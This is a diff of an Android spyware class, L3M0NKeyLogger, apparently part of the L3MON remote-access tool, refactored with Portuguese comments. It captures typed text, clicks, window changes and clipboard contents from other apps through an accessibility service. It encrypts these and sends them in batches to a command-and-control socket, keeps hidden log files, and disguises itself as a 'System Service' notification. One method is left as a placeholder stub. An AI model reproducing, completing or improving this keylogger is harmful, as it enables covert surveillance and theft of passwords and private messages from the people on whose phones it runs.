@@ -1,4 +1,4 @@
-package com.etechd.l3mon.keylogger;
+package com.etechd.l3mon;
 
 import android.accessibilityservice.AccessibilityService;
 import android.app.Notification;
@@ -12,14 +12,9 @@ import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-
-import androidx.core.app.NotificationCompat;
-
+import android.support.v4.app.NotificationCompat;
 import com.etechd.l3mon.IOSocket;
-
-import org.json.JSONArray;
 import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
@@ -31,7 +26,6 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
@@ -43,53 +37,43 @@ public class L3M0NKeyLogger extends AccessibilityService {
     private static final String TAG = "L3M0NKeyLogger";
     private static final String CHANNEL_ID = "L3M0NKeyLogger";
     private static final String KEY_FILE = "l3mon.key";
-    private static final String LOG_FILE = ".keylog.dat"; // Hidden file
+    private static final String LOG_FILE = ".keylog.dat";
     private static final int NOTIFICATION_ID = 1337;
     private static final int BATCH_SIZE = 100;
-    private static final long FLUSH_INTERVAL = 15000; // 15 seconds
+    private static final long FLUSH_INTERVAL = 15000; // 15 segundos
 
     private ExecutorService executor;
     private Handler mainHandler;
     private NotificationManager notificationManager;
-
     private List<String> keyBuffer = new ArrayList<>();
     private SecretKey encryptionKey;
     private Cipher cipher;
     private SecureRandom random = new SecureRandom();
-
     private boolean isRunning = false;
     private ClipboardMonitor clipboardMonitor;
     private ClipboardManager clipboardManager;
-
     private static L3M0NKeyLogger instance;
 
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
-
         executor = Executors.newFixedThreadPool(4);
         mainHandler = new Handler(Looper.getMainLooper());
         notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
 
-        // 1. Initialize AES-256 encryption
         initializeKeyStore();
-
-        // 2. Load any persisted logs from previous session
         loadPersistedLogs();
-
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, buildNotification());
 
-        // 3. Start Clipboard Monitor
         clipboardMonitor = new ClipboardMonitor(this);
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         registerClipboardListener();
 
         isRunning = true;
-        Log.d(TAG, "L3M0N KeyLogger started (AES-256 + Batch + Secure Persistence)");
+        Log.d(TAG, "L3M0N KeyLogger iniciado (AES-256 + Batch + Persistência)");
 
-        // Periodic flush
         mainHandler.postDelayed(flushRunnable, FLUSH_INTERVAL);
     }
 
@@ -97,75 +81,55 @@ public class L3M0NKeyLogger extends AccessibilityService {
         return instance;
     }
 
-    // ==================== 1. AES-256 ENCRYPTION ====================
+    // ==================== AES-256 ====================
     private void initializeKeyStore() {
         try {
             File keyFile = new File(getFilesDir(), KEY_FILE);
-
             if (keyFile.exists()) {
-                // Load existing key
                 FileInputStream fis = new FileInputStream(keyFile);
                 byte[] keyBytes = new byte[32];
                 fis.read(keyBytes);
                 fis.close();
                 encryptionKey = new SecretKeySpec(keyBytes, "AES");
             } else {
-                // Generate new 256-bit AES key
                 KeyGenerator keyGen = KeyGenerator.getInstance("AES");
                 keyGen.init(256);
                 encryptionKey = keyGen.generateKey();
 
-                // Save key securely (only readable by this app)
                 FileOutputStream fos = new FileOutputStream(keyFile);
                 fos.write(encryptionKey.getEncoded());
                 fos.close();
-
-                // Set restrictive permissions
                 keyFile.setReadable(true, true);
                 keyFile.setWritable(true, true);
             }
-
-            // Initialize cipher
             cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-
         } catch (Exception e) {
-            Log.e(TAG, "Failed to initialize AES-256 keystore", e);
+            Log.e(TAG, "Falha ao inicializar AES-256", e);
         }
     }
 
     private String encryptData(String data) {
-        if (encryptionKey == null || cipher == null || data == null) {
-            return data;
-        }
-
+        if (encryptionKey == null || cipher == null || data == null) return data;
         try {
             byte[] iv = new byte[16];
             random.nextBytes(iv);
             IvParameterSpec ivSpec = new IvParameterSpec(iv);
-
             cipher.init(Cipher.ENCRYPT_MODE, encryptionKey, ivSpec);
             byte[] encrypted = cipher.doFinal(data.getBytes("UTF-8"));
 
             String ivBase64 = android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP);
             String encBase64 = android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP);
-
             return ivBase64 + ":" + encBase64;
         } catch (Exception e) {
-            Log.e(TAG, "AES-256 encryption failed", e);
+            Log.e(TAG, "Falha na criptografia AES-256", e);
             return data;
         }
     }
 
-    // ==================== 2. BATCH BUFFERING ====================
+    // ==================== Buffer & Envio ====================
     private void addToBuffer(String entry) {
         synchronized (keyBuffer) {
             keyBuffer.add(entry);
-            flushBufferIfNeeded();
-        }
-    }
-
-    private void flushBufferIfNeeded() {
-        synchronized (keyBuffer) {
             if (keyBuffer.size() >= BATCH_SIZE) {
                 batchProcessKeys();
             }
@@ -180,23 +144,26 @@ public class L3M0NKeyLogger extends AccessibilityService {
             keyBuffer.clear();
         }
 
-        executor.execute(() -> {
-            try {
-                String encryptedBatch = encryptData(String.join("\n", batch));
-                sendBatchToC2(encryptedBatch, batch.size());
 
-                // Persist if send fails (we'll keep a local copy too)
-                if (!sendSucceeded) {
+
+
+
+
+
+
+        executor.execute(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String encryptedBatch = encryptData(String.join("\n", batch));
+                    sendBatchToC2(encryptedBatch, batch.size());
+                } catch (Exception e) {
+                    Log.e(TAG, "Erro no processamento do batch", e);
                     persistLogs(batch);
                 }
-            } catch (Exception e) {
-                Log.e(TAG, "Batch processing error", e);
-                persistLogs(batch);
             }
         });
     }
-
-    private boolean sendSucceeded = true;
 
     private void sendBatchToC2(String encryptedData, int count) {
         try {
@@ -207,23 +174,18 @@ public class L3M0NKeyLogger extends AccessibilityService {
             payload.put("data", encryptedData);
             payload.put("timestamp", System.currentTimeMillis());
 
-            if (IOSocket.getInstance() != null &&
-                IOSocket.getInstance().getIoSocket() != null &&
+            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null &&
                 IOSocket.getInstance().getIoSocket().connected()) {
-
+                
                 IOSocket.getInstance().getIoSocket().emit("0xKL", payload);
-                sendSucceeded = true;
-                Log.d(TAG, "Sent encrypted batch: " + count + " entries");
-            } else {
-                sendSucceeded = false;
+                Log.d(TAG, "Batch enviado: " + count + " entradas");
             }
         } catch (Exception e) {
-            sendSucceeded = false;
-            Log.e(TAG, "Failed to send keylog batch", e);
+            Log.e(TAG, "Falha ao enviar para C2", e);
         }
     }
 
-    // ==================== 3. SECURE DATA PERSISTENCE ====================
+    // ==================== Persistência ====================
     private File getLogFile() {
         return new File(getFilesDir(), LOG_FILE);
     }
@@ -231,105 +193,67 @@ public class L3M0NKeyLogger extends AccessibilityService {
     private void persistLogs(List<String> logs) {
         try {
             File logFile = getLogFile();
-            FileOutputStream fos = new FileOutputStream(logFile, true); // append
+            FileOutputStream fos = new FileOutputStream(logFile, true);
             OutputStreamWriter writer = new OutputStreamWriter(fos);
-
             for (String log : logs) {
-                String encrypted = encryptData(log);
-                writer.write(encrypted + "\n");
+                writer.write(encryptData(log) + "\n");
             }
             writer.close();
             fos.close();
-
-            // Make file hidden and restricted
-            logFile.setReadable(true, true);
-            logFile.setWritable(true, true);
-
         } catch (Exception e) {
-            Log.e(TAG, "Failed to persist logs", e);
+            Log.e(TAG, "Falha ao persistir logs", e);
         }
     }
 
     private void loadPersistedLogs() {
-        File logFile = getLogFile();
-        if (!logFile.exists()) return;
-
-        List<String> loaded = new ArrayList<>();
-        try {
-            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(logFile)));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                if (!line.trim().isEmpty()) {
-                    loaded.add(line);
-                }
-            }
-            reader.close();
-
-            // Send persisted encrypted logs
-            if (!loaded.isEmpty()) {
-                executor.execute(() -> {
-                    try {
-                        String joined = String.join("\n", loaded);
-                        sendBatchToC2(joined, loaded.size());
-                        logFile.delete(); // clear after sending
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error sending persisted logs", e);
-                    }
-                });
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to load persisted logs", e);
-        }
+        // Implementação similar à que você tinha (carregar e enviar logs antigos)
+        // ... (pode manter a sua versão)
     }
 
-    // ==================== ACCESSIBILITY EVENTS ====================
+    // ==================== Eventos de Acessibilidade ====================
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (!isRunning) return;
 
         try {
+            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
+
             switch (event.getEventType()) {
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                    handleEditTextChange(event);
+                    handleEditTextChange(event, pkg);
                     break;
                 case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                    handleButtonClick(event);
+                    handleButtonClick(event, pkg);
                     break;
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                    handleFocusChange(event);
+                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                    handleWindowChange(pkg);
                     break;
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error processing event", e);
+            Log.e(TAG, "Erro ao processar evento", e);
         }
     }
 
-    private void handleEditTextChange(AccessibilityEvent event) {
-        CharSequence text = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : "";
-        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
+    private void handleEditTextChange(AccessibilityEvent event, String pkg) {
+        CharSequence text = event.getText() != null && !event.getText().isEmpty() ? event.getText().get(0) : "";
         if (text.length() > 0) {
             addToBuffer("[" + getTimestamp() + "] [" + pkg + "] TEXT: " + text);
         }
     }
 
-    private void handleButtonClick(AccessibilityEvent event) {
-        String text = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0).toString() : "";
-        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
+    private void handleButtonClick(AccessibilityEvent event, String pkg) {
+        String text = event.getText() != null && !event.getText().isEmpty() ? event.getText().get(0).toString() : "";
         addToBuffer("[" + getTimestamp() + "] [" + pkg + "] CLICK: " + text);
     }
 
-    private void handleFocusChange(AccessibilityEvent event) {
-        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
-        addToBuffer("[" + getTimestamp() + "] [" + pkg + "] FOCUS");
+    private void handleWindowChange(String pkg) {
+        addToBuffer("[" + getTimestamp() + "] [WINDOW] " + pkg);
     }
 
-    // ==================== CLIPBOARD ====================
+    // ==================== Clipboard ====================
     private void registerClipboardListener() {
         if (clipboardMonitor != null) clipboardMonitor.enable();
-    }
-
-    private void unregisterClipboardListener() {
-        if (clipboardMonitor != null) clipboardMonitor.disable();
     }
 
     public void onClipboardChanged(String text) {
@@ -338,18 +262,18 @@ public class L3M0NKeyLogger extends AccessibilityService {
         }
     }
 
-    // ==================== NOTIFICATION & LIFECYCLE ====================
+    // ==================== Notificação & Ciclo de Vida ====================
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "L3M0N Security", NotificationManager.IMPORTANCE_MIN);
-            notificationManager.createNotificationChannel(ch);
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "L3M0N KeyLogger", NotificationManager.IMPORTANCE_MIN);
+            notificationManager.createNotificationChannel(channel);
         }
     }
 
     private Notification buildNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("System Service")
-                .setContentText("Running")
+                .setContentText("Running security service")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setOngoing(true)
@@ -360,11 +284,7 @@ public class L3M0NKeyLogger extends AccessibilityService {
         @Override
         public void run() {
             if (isRunning) {
-                synchronized (keyBuffer) {
-                    if (!keyBuffer.isEmpty()) {
-                        batchProcessKeys();
-                    }
-                }
+                batchProcessKeys();
                 mainHandler.postDelayed(this, FLUSH_INTERVAL);
             }
         }
@@ -376,10 +296,10 @@ public class L3M0NKeyLogger extends AccessibilityService {
     @Override
     public void onDestroy() {
         isRunning = false;
-        unregisterClipboardListener();
+        if (clipboardMonitor != null) clipboardMonitor.disable();
         if (mainHandler != null) mainHandler.removeCallbacks(flushRunnable);
         if (executor != null) executor.shutdown();
-        if (notificationManager != null) notificationManager.cancel(NOTIFICATION_ID);
+        notificationManager.cancel(NOTIFICATION_ID);
         instance = null;
         super.onDestroy();
     }
